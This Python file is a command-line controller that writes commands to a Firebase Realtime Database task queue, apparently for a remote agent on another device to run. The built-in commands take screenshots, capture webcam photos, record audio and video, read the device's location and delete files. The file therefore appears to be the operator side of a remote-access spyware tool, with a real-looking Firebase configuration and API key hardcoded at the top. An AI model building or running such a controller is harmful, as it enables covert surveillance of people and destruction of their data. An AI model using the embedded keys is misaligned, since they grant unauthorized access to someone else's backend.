# -*- coding: utf-8 -*-
"""
Controller: Python CLI to send commands to Firebase task queue
"""

import argparse, json, os, sys
from datetime import datetime
import pyrebase
from pathlib import Path

firebaseConfig = {
    "apiKey": "AIzaSyBpKUW9G9XMleeLLnW0F7PFdoEOZc0zLgA",
    "authDomain": "projectmanagement-c7883.firebaseapp.com",
    "databaseURL": "https://projectmanagement-c7883-default-rtdb.firebaseio.com",
    "projectId": "projectmanagement-c7883",
    "storageBucket": "projectmanagement-c7883.firebasestorage.app",
    "messagingSenderId": "907908963007",
    "appId": "1:907908963007:web:310717b4b8d2b839f0840a",
    "measurementId": "G-6YTNV66123"
}

firebase = pyrebase.initialize_app(firebaseConfig)
db = firebase.database()

TEMPLATES_DIR = Path(__file__).parent / "templates"
TEMPLATES_DIR.mkdir(exist_ok=True)

BUILTIN = {
    "screenshot": "Take a screenshot",
    "deviceinfo": "Get device info",
    "webcam_photo": "Capture webcam image",
    "record_audio": "Record audio (3s)",
    "record_video": "Record video (5s)",
    "location_snapshot": "Get current location",
    "delete": "Delete file/folder (usage: delete <path>)",
}

def now():
    from datetime import datetime
    return datetime.utcnow().isoformat() + "Z"


def list_templates():
    files = list(TEMPLATES_DIR.glob("*.json"))
    if not files:
        print("⚠️  No user-defined templates found.")
        return
    for f in files:
        data = json.load(open(f))
        print(f"📝 {f.name}: {data.get('description','No description')}")


def push_command(command):
    db.child("task").update({
        "command": command,
        "issued_at": now(),
        "source": "controller"
    })
    print(f"✅ Command '{command}' pushed to Firebase.")


def dry_run(command):
    print(f"[DRY-RUN] Would execute: {command}")


def main():
    parser = argparse.ArgumentParser(description="Firebase Command Controller CLI")
    parser.add_argument("command", nargs="?", help="Command name or template")
    parser.add_argument("args", nargs="*", help="Arguments for the command")
    parser.add_argument("--list", action="store_true", help="List built-in commands")
    parser.add_argument("--templates", action="store_true", help="List custom templates")
    parser.add_argument("--dry-run", action="store_true", help="Show what would happen without sending")
    parser.add_argument("--examples", action="store_true", help="Show example usages")

    args = parser.parse_args()

    if args.list:
        print("🧩 Built-in Commands:")
        for k, v in BUILTIN.items():
            print(f" - {k}: {v}")
        return

    if args.templates:
        list_templates()
        return

    if args.examples:
        print("""
Examples:
  python controller.py screenshot
  python controller.py delete "D:\\Test\\old.txt"
  python controller.py location_snapshot
  python controller.py --dry-run webcam_photo
        """)
        return

    if not args.command:
        parser.print_help()
        return

    cmd = args.command
    if cmd not in BUILTIN and not (TEMPLATES_DIR / f"{cmd}.json").exists():
        print(f"❌ Unknown command '{cmd}'. Use --list to see available.")
        return

    if args.dry_run:
        dry_run(f"{cmd} {' '.join(args.args)}".strip())
    else:
        push_command(f"{cmd} {' '.join(args.args)}".strip())


if __name__ == "__main__":
    main()
